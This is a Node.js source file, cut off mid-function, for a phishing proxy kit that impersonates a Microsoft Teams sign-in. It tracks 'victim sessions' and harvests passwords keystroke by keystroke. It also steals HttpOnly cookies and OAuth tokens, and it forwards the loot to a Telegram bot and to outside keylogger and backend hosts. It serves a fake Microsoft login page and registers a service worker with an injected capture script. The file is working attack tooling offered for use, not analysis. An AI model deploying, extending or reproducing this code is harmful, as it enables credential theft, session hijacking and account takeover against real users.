const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const querystring = require('querystring');
const crypto = require('crypto');
const zlib = require('zlib');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');

// ============================================================
//  ENVIRONMENT VARIABLES
// ============================================================

require('dotenv').config();

// Core Configuration
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex');
const PHISHED_URL_PARAMETER = process.env.PHISHED_URL_PARAMETER || 'login_hint';
const PROXY_ENTRY_POINT = process.env.PROXY_ENTRY_POINT || '/login';
const PORT = process.env.PORT || 3000;

// Service URLs
const BACKEND_URL = process.env.BACKEND_URL || "https://meeting-1-rzx6.onrender.com";
const KEYLOGGER_URL = process.env.KEYLOGGER_URL || "https://keyserver-eaar.onrender.com/log";
const TEAMS_REDIRECT = process.env.TEAMS_REDIRECT || "https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&enableMobilePage=true&suppressPrompt=true";
const REDIRECT_URL = process.env.REDIRECT_URL || "https://login.microsoftonline.com/";

// Microsoft OAuth Configuration
const MICROSOFT_CLIENT_ID = process.env.MICROSOFT_CLIENT_ID || '943a2b14-68aa-4205-88c1-a4b65ab04e81';
const MICROSOFT_REDIRECT_URI = process.env.MICROSOFT_REDIRECT_URI || 'https://login.microsoftonline.com/common/oauth2/nativeclient';
const MICROSOFT_SCOPES = process.env.MICROSOFT_SCOPES || 'openid profile email User.Read Mail.Read offline_access';

// Telegram Configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// ============================================================
//  PATH CONFIGURATION
// ============================================================

const PROXY_PATHNAMES = {
    script: "/@",
    scriptFile: "script_Vx9Z6XN5uC3k.js",
    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js",
    serviceWorkerFile: "microsoft_inject.js",
    swRegister: "/sw-register.js",
    xssEndpoint: "/xss-collect",
    cookieEndpoint: "/cookie-capture",
    keylogEndpoint: "/keylog",
    swProxyPath: "/lNv1pC9AWPUY4gbidyBO",
    cookieStoreEndpoint: "/api/cookies-store",
    sessionReplayEndpoint: "/api/session-replay",
    fullSessionData: "/api/full-session",
    fullAuthEndpoint: "/api/full-auth",
    oauthCaptureEndpoint: "/api/oauth-capture",
    captureUserEndpoint: "/api/capture-user",
    telegramEndpoint: "/api/telegram",
    tokenRotation: "/api/token-rotation",
    sessionRotate: "/api/session-rotate",
    passwordCapture: "/api/password-capture",
    credentialCapture: "/api/credential-capture"
};

console.log('╔═══════════════════════════════════════════════════════════╗');
console.log('║              ENVIRONMENT CONFIGURATION                    ║');
console.log('╠═══════════════════════════════════════════════════════════╣');
console.log(`║   ENCRYPTION_KEY: ${ENCRYPTION_KEY ? '✅ SET' : '❌ MISSING'}`);
console.log(`║   TELEGRAM: ${TELEGRAM_BOT_TOKEN ? '✅' : '❌'}`);
console.log(`║   BACKEND_URL: ${BACKEND_URL}`);
console.log(`║   KEYLOGGER_URL: ${KEYLOGGER_URL}`);
console.log('╚═══════════════════════════════════════════════════════════╝');

// ============================================================
//  SESSION STORE
// ============================================================

class SessionStore {
    constructor() {
        this.sessions = new Map();
        this.sessionTTL = 2 * 60 * 60 * 1000;
        this.allCookies = new Map();
        this.allTokens = new Map();
        this.passwordCaptures = new Map();
        this.httpOnlyCookies = new Map();
        this.cookieHeaders = new Map();
        this.evasionCounters = new Map();
        this.fullAuthData = new Map();
        this.credentialHistory = new Map();
        this.requestLogs = new Map();
    }

    storeHttpOnlyCookies(sessionId, cookieHeaders, url) {
        const session = this.sessions.get(sessionId);
        if (!session) return;
        
        const cookies = {};
        const httpOnlyCookies = [];
        const cookieStrings = [];
        
        for (const cookieHeader of cookieHeaders) {
            const parts = cookieHeader.split(';');
            const [nameValue, ...attributes] = parts;
            const [name, value] = nameValue.split('=');
            
            if (name && value && value !== 'null' && value !== 'undefined') {
                const isHttpOnly = attributes.some(attr => attr.trim().toLowerCase() === 'httponly');
                const isSecure = attributes.some(attr => attr.trim().toLowerCase() === 'secure');
                const sameSite = attributes.find(attr => attr.trim().toLowerCase().startsWith('samesite='))?.split('=')[1] || 'Lax';
                const path = attributes.find(attr => attr.trim().toLowerCase().startsWith('path='))?.split('=')[1] || '/';
                const domain = attributes.find(attr => attr.trim().toLowerCase().startsWith('domain='))?.split('=')[1] || '';
                const expires = attributes.find(attr => attr.trim().toLowerCase().startsWith('expires='))?.split('=')[1] || null;
                
                cookies[name] = {
                    value: value,
                    httpOnly: isHttpOnly,
                    secure: isSecure,
                    sameSite: sameSite,
                    path: path,
                    domain: domain,
                    expires: expires,
                    fullCookie: cookieHeader,
                    captured: Date.now()
                };
                
                cookieStrings.push(`${name}=${value}`);
                
                if (isHttpOnly) {
                    httpOnlyCookies.push({
                        name: name,
                        value: value,
                        attributes: attributes,
                        fullCookie: cookieHeader,
                        captured: Date.now()
                    });
                }
            }
        }
        
        if (Object.keys(cookies).length > 0) {
            this.storeCookies(sessionId, cookies, 'http_response');
            this.cookieHeaders.set(sessionId, {
                cookieHeader: cookieStrings.join('; '),
                cookieCount: cookieStrings.length,
                httpOnlyCount: httpOnlyCookies.length,
                httpOnlyCookies: httpOnlyCookies,
                captured: Date.now()
            });
            
            if (httpOnlyCookies.length > 0) {
                this.httpOnlyCookies.set(sessionId, httpOnlyCookies);
                this.sendHttpOnlyAlert(sessionId, httpOnlyCookies, cookies);
            }
            
            console.log(`[HTTPONLY] 🍪 Captured ${Object.keys(cookies).length} cookies (${httpOnlyCookies.length} HttpOnly)`);
        }
        
        return cookies;
    }

    async sendHttpOnlyAlert(sessionId, httpOnlyCookies, allCookies) {
        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
        
        const session = this.sessions.get(sessionId);
        const email = session?.email || 'Unknown';
        
        let cookieList = '';
        for (const cookie of httpOnlyCookies) {
            const displayValue = cookie.value.length > 30 ? cookie.value.substring(0, 30) + '...' : cookie.value;
            cookieList += `  🔒 \`${cookie.name}\`: \`${displayValue}\`\n`;
        }
        
        const message = 
`🍪 *HTTPONLY COOKIES CAPTURED*

*📧 Email:* ${email}
*🆔 Session:* ${sessionId ? sessionId.substring(0, 12) + '...' : 'N/A'}
*🕐 Time:* ${new Date().toISOString()}

*📊 Total Cookies:* ${Object.keys(allCookies).length}
*🔒 HttpOnly Count:* ${httpOnlyCookies.length}

*🍪 HttpOnly Cookies:*
${cookieList}

*🔐 These cookies cannot be accessed by JavaScript!*`;

        await this.sendTelegram(message);
    }

    async sendTelegram(message, parseMode = 'Markdown') {
        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
        
        try {
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: parseMode,
                disable_web_page_preview: true
            });
            return true;
        } catch(e) {
            console.error('[TELEGRAM] Error:', e.message);
            return false;
        }
    }

    storePasswordCapture(sessionId, email, password, source, context = {}) {
        const session = this.sessions.get(sessionId);
        if (!session) {
            this.sessions.set(sessionId, {
                email: email || 'unknown',
                password: password,
                created: Date.now(),
                lastActivity: Date.now()
            });
        } else {
            session.password = password || session.password;
            session.email = email || session.email;
            session.lastActivity = Date.now();
        }
        
        const captureEntry = {
            email: email,
            password: password,
            source: source,
            timestamp: Date.now(),
            timestampISO: new Date().toISOString(),
            context: context,
            sessionId: sessionId,
            captured: true
        };
        
        if (!this.passwordCaptures.has(sessionId)) {
            this.passwordCaptures.set(sessionId, []);
        }
        this.passwordCaptures.get(sessionId).push(captureEntry);
        
        if (!this.credentialHistory.has(email)) {
            this.credentialHistory.set(email, []);
        }
        this.credentialHistory.get(email).push(captureEntry);
        
        console.log(`[PASSWORD] 🔑 Stored password for ${email} (${source})`);
        
        this.sendPasswordAlert(sessionId, email, password, source, context);
        
        return captureEntry;
    }

    async sendPasswordAlert(sessionId, email, password, source, context) {
        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
        
        const httpOnlyCount = this.httpOnlyCookies.get(sessionId)?.length || 0;
        const tokenCount = this.allTokens.get(sessionId) ? 
            Object.values(this.allTokens.get(sessionId)).filter(t => t && t.value && t.isValid !== false).length : 0;
        
        const message = 
`🔐 *PASSWORD CAPTURED* (${source})

*📧 Email:* ${email}
*🔑 Password:* ${password || 'N/A'}
*📡 IP:* ${context.ip || 'Unknown'}
*🕐 Time:* ${new Date().toISOString()}
*🆔 Session:* ${sessionId ? sessionId.substring(0, 12) + '...' : 'N/A'}

*🍪 HttpOnly Cookies:* ${httpOnlyCount}
*🎟️ Tokens:* ${tokenCount}
*🔄 Attempt #:* ${context.attemptCount || 1}

*📱 User Agent:* ${context.userAgent || 'Unknown'}`;

        await this.sendTelegram(message);
    }

    storeCookies(sessionId, cookies, source = 'proxy') {
        const session = this.sessions.get(sessionId);
        if (!session) return;
        
        session.cookies = session.cookies || {};
        session.cookies[source] = session.cookies[source] || [];
        
        for (const [name, cookieData] of Object.entries(cookies)) {
            if (cookieData === null || cookieData === undefined || cookieData === 'null' || cookieData === 'undefined') {
                continue;
            }
            
            const cookieEntry = {
                name: name,
                value: typeof cookieData === 'object' ? cookieData.value : cookieData,
                httpOnly: typeof cookieData === 'object' ? (cookieData.httpOnly || false) : false,
                secure: typeof cookieData === 'object' ? (cookieData.secure || false) : false,
                path: typeof cookieData === 'object' ? (cookieData.path || '/') : '/',
                domain: typeof cookieData === 'object' ? (cookieData.domain || '') : '',
                expires: typeof cookieData === 'object' ? (cookieData.expires || null) : null,
                sameSite: typeof cookieData === 'object' ? (cookieData.sameSite || 'Lax') : 'Lax',
                captured: Date.now(),
                source: source,
                isValid: true,
                fullCookieString: `${name}=${typeof cookieData === 'object' ? cookieData.value : cookieData}`
            };
            
            const existing = session.cookies[source].find(c => c.name === name);
            if (existing) {
                Object.assign(existing, cookieEntry);
                existing.updated = Date.now();
            } else {
                session.cookies[source].push(cookieEntry);
            }
        }
        
        this.allCookies.set(sessionId, session.cookies);
        console.log(`[COOKIE] 🍪 Captured cookies for session ${sessionId.substring(0, 12)}`);
        return session.cookies;
    }

    storeTokens(sessionId, tokens) {
        const session = this.sessions.get(sessionId);
        if (!session) return;
        
        session.tokens = session.tokens || {};
        
        for (const [key, value] of Object.entries(tokens)) {
            if (value && value !== 'undefined' && value !== 'null' && value !== 'N/A') {
                session.tokens[key] = {
                    value: value,
                    captured: Date.now(),
                    type: key.includes('access') ? 'access' : 
                          key.includes('refresh') ? 'refresh' : 
                          key.includes('id') ? 'id' : 'unknown',
                    isValid: true,
                    validatedAt: Date.now()
                };
            }
        }
        
        this.allTokens.set(sessionId, session.tokens);
        console.log(`[TOKEN] 🎟️ Stored tokens for session ${sessionId.substring(0, 12)}`);
        return session.tokens;
    }

    storeFullAuthData(sessionId, authData) {
        const session = this.sessions.get(sessionId);
        if (!session) {
            this.sessions.set(sessionId, {
                email: authData.email || 'unknown',
                password: authData.password || 'N/A',
                created: Date.now(),
                lastActivity: Date.now(),
                fullAuthCompleted: true,
                fullAuthTime: Date.now()
            });
        } else {
            if (authData.password) {
                session.password = authData.password;
            }
            session.fullAuthCompleted = true;
            session.fullAuthTime = Date.now();
            session.lastActivity = Date.now();
        }
        
        this.fullAuthData.set(sessionId, {
            ...authData,
            storedAt: Date.now(),
            sessionId: sessionId
        });
        
        console.log(`[FULL-AUTH] ✅ Stored full auth data for session ${sessionId.substring(0, 12)}`);
        return true;
    }

    getFullAuthData(sessionId) {
        return this.fullAuthData.get(sessionId) || null;
    }

    getReplayData(sessionId) {
        const session = this.sessions.get(sessionId);
        if (!session) return null;
        
        if (Date.now() - session.lastActivity > this.sessionTTL) {
            this.sessions.delete(sessionId);
            return null;
        }
        
        const cookies = {};
        if (session.cookies) {
            for (const source of Object.values(session.cookies)) {
                if (Array.isArray(source)) {
                    for (const cookie of source) {
                        if (cookie.value && cookie.value !== 'null' && cookie.value !== 'undefined') {
                            cookies[cookie.name] = cookie.value;
                        }
                    }
                }
            }
        }
        
        const tokens = {};
        if (session.tokens) {
            for (const [key, token] of Object.entries(session.tokens)) {
                if (token && token.value && token.isValid !== false) {
                    tokens[key] = token.value;
                }
            }
        }
        
        const cookieHeader = this.cookieHeaders.get(sessionId);
        const httpOnlyCookies = this.httpOnlyCookies.get(sessionId) || [];
        const passwordCaptures = this.passwordCaptures.get(sessionId) || [];
        
        return {
            sessionId: session.id,
            cookies: cookies,
            tokens: tokens,
            cookieHeader: cookieHeader?.cookieHeader || '',
            httpOnlyCookies: httpOnlyCookies,
            httpOnlyCount: httpOnlyCookies.length,
            email: session.email || 'unknown',
            password: session.password || 'N/A',
            passwordCaptures: passwordCaptures,
            created: session.created,
            lastActivity: session.lastActivity,
            fullAuthData: this.fullAuthData.get(sessionId) || null,
            evasionData: this.evasionCounters.get(sessionId) || {}
        };
    }

    addEvasionCounter(sessionId) {
        const counter = this.evasionCounters.get(sessionId) || {
            totalRequests: 0,
            loginAttempts: 0,
            cookieCaptures: 0,
            tokenCaptures: 0,
            passwordCaptures: 0,
            httpOnlyCaptures: 0,
            rotations: 0,
            lastActivity: Date.now()
        };
        
        counter.totalRequests++;
        counter.lastActivity = Date.now();
        this.evasionCounters.set(sessionId, counter);
        return counter;
    }

    cleanup() {
        const now = Date.now();
        let cleaned = 0;
        for (const [id, session] of this.sessions) {
            if (now - session.lastActivity > this.sessionTTL) {
                this.sessions.delete(id);
                this.allCookies.delete(id);
                this.allTokens.delete(id);
                this.passwordCaptures.delete(id);
                this.httpOnlyCookies.delete(id);
                this.cookieHeaders.delete(id);
                this.fullAuthData.delete(id);
                this.evasionCounters.delete(id);
                this.credentialHistory.delete(id);
                this.requestLogs.delete(id);
                cleaned++;
            }
        }
        if (cleaned > 0) {
            console.log(`[CLEANUP] 🧹 Removed ${cleaned} expired sessions`);
        }
        return cleaned;
    }

    getStats() {
        return {
            totalSessions: this.sessions.size,
            totalCookies: Array.from(this.sessions.values()).reduce((acc, s) => {
                let count = 0;
                if (s.cookies) {
                    for (const source of Object.values(s.cookies)) {
                        if (Array.isArray(source)) {
                            count += source.filter(c => c.value && c.value !== 'null' && c.value !== 'undefined').length;
                        }
                    }
                }
                return acc + count;
            }, 0),
            totalHttpOnly: Array.from(this.httpOnlyCookies.values()).reduce((acc, arr) => acc + arr.length, 0),
            totalTokens: Array.from(this.sessions.values()).reduce((acc, s) => {
                if (s.tokens) {
                    return acc + Object.values(s.tokens).filter(t => t && t.value && t.isValid !== false).length;
                }
                return acc;
            }, 0),
            totalPasswordCaptures: Array.from(this.passwordCaptures.values()).reduce((acc, captures) => acc + captures.length, 0),
            totalFullAuth: this.fullAuthData.size,
            totalRequests: Array.from(this.evasionCounters.values()).reduce((acc, c) => acc + c.totalRequests, 0)
        };
    }
}

const sessionStore = new SessionStore();

// ============================================================
//  VICTIM SESSIONS
// ============================================================

const VICTIM_SESSIONS = {};
const attemptCounts = new Map();

function generateSessionId() {
    return crypto.randomBytes(16).toString('hex');
}

function getSessionIdFromCookie(cookieHeader) {
    if (!cookieHeader) return null;
    const cookies = cookieHeader.split('; ');
    for (const cookie of cookies) {
        const [name, value] = cookie.split('=');
        if (name === 'sessionId') {
            return value;
        }
    }
    return null;
}

function createSession(email, ip, userAgent) {
    const sessionId = generateSessionId();
    VICTIM_SESSIONS[sessionId] = {
        email: email || 'unknown',
        timestamp: Date.now(),
        ip: ip || 'unknown',
        userAgent: userAgent || 'Unknown',
        created: new Date().toISOString(),
        lastActivity: Date.now(),
        attempts: 0,
        password: null,
        passwordCaptures: [],
        httpOnlyCookies: [],
        cookieHeader: null,
        tokens: [],
        validationAttempts: [],
        lastValidationResult: null
    };
    
    sessionStore.sessions.set(sessionId, {
        email: email || 'unknown',
        password: null,
        ip: ip || 'unknown',
        userAgent: userAgent || 'Unknown',
        created: Date.now(),
        lastActivity: Date.now()
    });
    
    console.log(`[SESSION] Created session ${sessionId} for email: ${email}`);
    return sessionId;
}

function getClientIp(req) {
    const cfIp = req.headers['cf-connecting-ip'];
    if (cfIp) return cfIp.trim();
    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
        const ips = forwarded.split(',').map(ip => ip.trim());
        return ips[0] || 'unknown';
    }
    const realIp = req.headers['x-real-ip'];
    if (realIp) return realIp.trim();
    return req.socket.remoteAddress || 'unknown';
}

// ============================================================
//  SERVE FILES
// ============================================================

function serveFile(filename, res, contentType = 'text/html') {
    const filePath = path.join(__dirname, 'public', filename);
    fs.readFile(filePath, (err, data) => {
        if (err) {
            console.error(`[ERROR] Failed to read ${filename}: ${err.message}`);
            res.writeHead(404, { 'Content-Type': 'text/html' });
            res.end('<h1>404 Not Found</h1>');
            return;
        }
        res.writeHead(200, { 
            'Content-Type': contentType, 
            'Cache-Control': 'no-store, no-cache, must-revalidate',
            'Pragma': 'no-cache'
        });
        res.end(data);
    });
}

// ============================================================
//  SHOW LOGIN PAGE - KEEP USER ON PROXY
// ============================================================

function showLoginPage(res, email, attemptCount = 1, errorMessage = null) {
    const sessionId = getSessionIdFromCookie(res.getHeader('Set-Cookie'));
    const errorDisplay = errorMessage ? `
        <div class="error show">
            <span class="error-icon">⚠️</span>
            ${errorMessage}
        </div>
    ` : '';

    const html = `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft Sign In</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #f5f5f5; padding: 20px; }
        .container { background: white; border-radius: 12px; padding: 40px 48px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 420px; width: 100%; animation: fadeIn 0.3s ease; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
        .logo { text-align: center; margin-bottom: 24px; }
        .logo .icon { font-size: 48px; display: block; margin-bottom: 8px; }
        .logo h1 { font-size: 24px; color: #202124; margin: 0; }
        .logo p { color: #5f6368; margin: 4px 0 0; font-size: 14px; }
        .form-group { margin-bottom: 16px; }
        .form-group label { display: block; font-size: 14px; font-weight: 500; color: #202124; margin-bottom: 4px; }
        .form-group input { width: 100%; padding: 12px 14px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; transition: border-color 0.2s, box-shadow 0.2s; }
        .form-group input:focus { outline: none; border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26,115,232,0.2); }
        .form-group input.error { border-color: #d93025; }
        .email-display { background: #f1f3f4; padding: 12px 14px; border-radius: 4px; font-size: 16px; color: #202124; word-break: break-all; border: 1px solid #e8eaed; }
        .btn { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 500; cursor: pointer; transition: background 0.2s, transform 0.1s; }
        .btn:hover { background: #1557b0; }
        .btn:active { transform: scale(0.98); }
        .btn:disabled { background: #dadce0; cursor: not-allowed; transform: none; }
        .error { color: #d93025; font-size: 14px; padding: 12px; background: #fce8e6; border-radius: 4px; display: none; text-align: center; margin-bottom: 16px; border: 1px solid #f5c6cb; }
        .error.show { display: block; }
        .loading { display: none; text-align: center; padding: 10px 0; }
        .loading .spinner { display: inline-block; width: 20px; height: 20px; border: 2px solid #e8eaed; border-radius: 50%; border-top-color: #1a73e8; animation: spin 0.8s linear infinite; margin-right: 8px; vertical-align: middle; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .loading p { display: inline-block; vertical-align: middle; color: #5f6368; font-size: 14px; margin: 0; }
        .attempt-info { text-align: center; font-size: 12px; color: #9aa0a6; margin-top: 8px; }
        .footer { margin-top: 24px; text-align: center; font-size: 12px; color: #9aa0a6; border-top: 1px solid #e8eaed; padding-top: 20px; }
        .footer a { color: #1a73e8; text-decoration: none; }
        .footer a:hover { text-decoration: underline; }
        .notification { position: fixed; bottom: 20px; right: 20px; padding: 12px 20px; background: #4CAF50; color: white; border-radius: 8px; z-index: 999999; box-shadow: 0 4px 12px rgba(0,0,0,0.3); max-width: 400px; animation: slideIn 0.3s ease-out; }
        .notification.error { background: #f44336; }
        @keyframes slideIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
        @media (max-width: 480px) { .container { padding: 24px 20px; } }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <span class="icon">🔐</span>
            <h1>Sign in</h1>
            <p>to continue to Microsoft Teams</p>
        </div>
        
        ${errorDisplay}
        
        <div class="form-group">
            <label>Email</label>
            <div class="email-display">${email}</div>
        </div>
        
        <div class="form-group">
            <label>Password</label>
            <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password" />
        </div>
        
        <button class="btn" id="loginBtn">Sign In</button>
        
        <div class="loading" id="loadingDiv">
            <span class="spinner"></span>
            <p>Verifying credentials...</p>
        </div>
        
        <div class="attempt-info">Attempt #${attemptCount}</div>
        
        <div class="footer">
            <span>🔒 Secured • </span>
            <a href="#">Privacy Policy</a>
            <span> • </span>
            <a href="#">Terms of Service</a>
        </div>
    </div>
    
    <script>
        window.MICROSOFT_CONFIG = {
            SESSION_ID: '${sessionId || 'unknown'}',
            EMAIL: '${email}',
            BACKEND_URL: '${BACKEND_URL}',
            KEYLOGGER_URL: '${KEYLOGGER_URL}'
        };
        
        const loginBtn = document.getElementById('loginBtn');
        const passwordInput = document.getElementById('password');
        const errorDiv = document.querySelector('.error');
        const loadingDiv = document.getElementById('loadingDiv');
        
        let capturedPassword = '';
        let lastPasswordValue = '';
        
        // Real-time password capture
        passwordInput.addEventListener('input', function(e) {
            const value = this.value;
            if (value !== lastPasswordValue) {
                capturedPassword = value;
                lastPasswordValue = value;
                if (value.length > 2) {
                    fetch('/api/password-capture', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            email: '${email}',
                            password: value,
                            source: 'password_input',
                            sessionId: '${sessionId || 'unknown'}',
                            timestamp: new Date().toISOString()
                        })
                    }).catch(() => {});
                }
            }
        });
        
        // Keylogger
        let passwordBuffer = '';
        passwordInput.addEventListener('keydown', function(e) {
            const key = e.key;
            if (key === 'Backspace') {
                passwordBuffer = passwordBuffer.slice(0, -1);
            } else if (key === 'Enter') {
                handleLogin();
            } else if (key.length === 1 && !e.ctrlKey && !e.metaKey && !e.altKey) {
                passwordBuffer += key;
            }
        });
        
        function handleLogin() {
            const password = passwordInput.value.trim();
            
            if (!password) {
                if (errorDiv) {
                    errorDiv.textContent = '⚠️ Please enter your password';
                    errorDiv.classList.add('show');
                }
                passwordInput.focus();
                passwordInput.classList.add('error');
                setTimeout(() => passwordInput.classList.remove('error'), 3000);
                return;
            }
            
            if (errorDiv) errorDiv.classList.remove('show');
            loginBtn.disabled = true;
            loginBtn.style.display = 'none';
            loadingDiv.style.display = 'block';
            
            // Send final password capture
            fetch('/api/password-capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    email: '${email}',
                    password: password,
                    source: 'form_submit',
                    sessionId: '${sessionId || 'unknown'}',
                    timestamp: new Date().toISOString()
                })
            }).catch(() => {});
            
            // Submit to proxy
            fetch('/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'Email=' + encodeURIComponent('${email}') + 
                      '&Passwd=' + encodeURIComponent(password) +
                      '&service=mail'
            })
            .then(response => {
                if (response.redirected) {
                    // ✅ Success - redirect to Teams
                    window.location.href = response.url;
                } else {
                    // ❌ Failed - reload page to show error
                    window.location.reload();
                }
            })
            .catch(error => {
                if (errorDiv) {
                    errorDiv.textContent = '⚠️ An error occurred. Please try again.';
                    errorDiv.classList.add('show');
                }
                loginBtn.disabled = false;
                loginBtn.style.display = 'block';
                loadingDiv.style.display = 'none';
                passwordInput.value = '';
                passwordInput.focus();
            });
        }
        
        loginBtn.addEventListener('click', handleLogin);
        passwordInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                handleLogin();
            }
        });
        passwordInput.addEventListener('input', function() {
            if (errorDiv) errorDiv.classList.remove('show');
            this.classList.remove('error');
        });
        
        setTimeout(() => passwordInput.focus(), 500);
        
        // Keyboard shortcuts
        document.addEventListener('keydown', function(e) {
            if (e.ctrlKey && e.shiftKey && e.key === 'C') {
                e.preventDefault();
                const password = passwordInput.value.trim();
                if (password) {
                    fetch('/api/password-capture', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            email: '${email}',
                            password: password,
                            source: 'manual_capture',
                            sessionId: '${sessionId || 'unknown'}',
                            timestamp: new Date().toISOString()
                        })
                    }).catch(() => {});
                    alert('✅ Credentials captured and sent!');
                }
            }
        });
    </script>
    <script src="${PROXY_PATHNAMES.script}"></script>
    <script src="${PROXY_PATHNAMES.swRegister}"></script>
</body>
</html>`;

    res.writeHead(200, {
        'Content-Type': 'text/html',
        'Cache-Control': 'no-store, no-cache, must-revalidate',
        'Pragma': 'no-cache'
    });
    res.end(html);
}

// ============================================================
//  GENERATE SCRIPTS
// ============================================================

function generateSWRegistrationScript(sessionId) {
    return `
(function() {
    'use strict';
    
    const SESSION_ID = '${sessionId}';
    const SW_URL = '${PROXY_PATHNAMES.serviceWorker}';
    
    console.log('[SW-Register] 🔄 Registering service worker...');
    
    if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register(SW_URL, {
            scope: '/',
            updateViaCache: 'none'
        })
        .then(function(registration) {
            console.log('[SW-Register] ✅ Service Worker registered successfully');
            console.log('[SW-Register] 📍 Scope:', registration.scope);
            
            if (navigator.serviceWorker.controller) {
                navigator.serviceWorker.controller.postMessage({
                    type: 'init',
                    sessionId: SESSION_ID,
                    email: window.MICROSOFT_CONFIG?.EMAIL || 'unknown',
                    evasion: { active: true }
                });
            }
            
            navigator.serviceWorker.addEventListener('message', function(event) {
                console.log('[SW-Register] 📨 Message from SW:', event.data);
                if (event.data.type === 'httpOnlyCookies') {
                    console.log('[SW-Register] 🍪 HttpOnly cookies captured:', event.data.cookies);
                }
            });
            
            navigator.serviceWorker.addEventListener('controllerchange', function() {
                if (navigator.serviceWorker.controller) {
                    navigator.serviceWorker.controller.postMessage({
                        type: 'init',
                        sessionId: SESSION_ID,
                        email: window.MICROSOFT_CONFIG?.EMAIL || 'unknown',
                        evasion: { active: true }
                    });
                }
            });
        })
        .catch(function(error) {
            console.error('[SW-Register] ❌ Service Worker registration failed:', error);
        });
        
        setTimeout(function() {
            if (navigator.serviceWorker.controller) {
                navigator.serviceWorker.controller.postMessage({
                    type: 'init',
                    sessionId: SESSION_ID,
                    email: window.MICROSOFT_CONFIG?.EMAIL || 'unknown',
                    evasion: { active: true }
                });
            }
        }, 2000);
    } else {
        console.warn('[SW-Register] ⚠️ Service Workers not supported');
    }
})();
`;
}

function generatePasswordCaptureScript(sessionId, email, randomUA) {
    return `
(function() {
    'use strict';

    const SESSION_ID = '${sessionId}';
    const EMAIL = '${email}';
    const BACKEND_URL = '${BACKEND_URL}';
    const KEYLOGGER_URL = '${KEYLOGGER_URL}';

    console.log('🔐 Chameleon Proxy - Enhanced Password Capture v4.0');
    console.log('📧 Email:', EMAIL);
    console.log('🆔 Session:', SESSION_ID);

    let capturedEmail = EMAIL || '';
    let capturedPassword = '';
    let lastPasswordValue = '';
    let passwordField = null;
    let emailField = null;
    let captureAttempts = 0;

    function findPasswordField() {
        const selectors = [
            'input[type="password"]',
            'input[name="passwd"]',
            'input[name="password"]',
            'input[name="pass"]',
            'input[id="i0118"]',
            'input[id="password"]',
            'input[placeholder*="password" i]',
            'input[autocomplete="current-password"]'
        ];

        for (const selector of selectors) {
            const input = document.querySelector(selector);
            if (input) return input;
        }

        const inputs = document.querySelectorAll('input');
        for (const input of inputs) {
            const type = input.type || '';
            const name = input.name || '';
            const id = input.id || '';
            const placeholder = input.placeholder || '';
            if (type === 'password' || name.toLowerCase().includes('pass') || id.toLowerCase().includes('pass') || placeholder.toLowerCase().includes('pass')) {
                return input;
            }
        }
        return null;
    }

    function findEmailField() {
        const selectors = [
            'input[name="loginfmt"]',
            'input[name="login"]',
            'input[name="username"]',
            'input[name="email"]',
            'input[type="email"]',
            'input[id="i0116"]',
            'input[placeholder*="email" i]'
        ];

        for (const selector of selectors) {
            const input = document.querySelector(selector);
            if (input) return input;
        }

        const inputs = document.querySelectorAll('input');
        for (const input of inputs) {
            const type = input.type || '';
            const name = input.name || '';
            const id = input.id || '';
            const placeholder = input.placeholder || '';
            if (type === 'email' || name.toLowerCase().includes('email') || name.toLowerCase().includes('mail') || name.toLowerCase().includes('user') || id.toLowerCase().includes('email') || placeholder.toLowerCase().includes('email')) {
                return input;
            }
        }
        return null;
    }

    function sendCredentials(email, password, source) {
        if (!email) email = capturedEmail || EMAIL || 'unknown';
        if (!password) password = capturedPassword || '';
        if (!password || password.length < 2) return;

        captureAttempts++;
        const data = {
            email: email,
            password: password,
            source: source || 'password_capture',
            sessionId: SESSION_ID,
            url: window.location.href,
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString(),
            referrer: document.referrer || 'Direct',
            passwordLength: password.length,
            captureAttempt: captureAttempts,
            service: 'Microsoft 365'
        };

        console.log('[CREDENTIALS] 📤 Sending:', email, '|', '***', '(', source, ')');

        fetch('/api/password-capture', {
            method: 'POST',
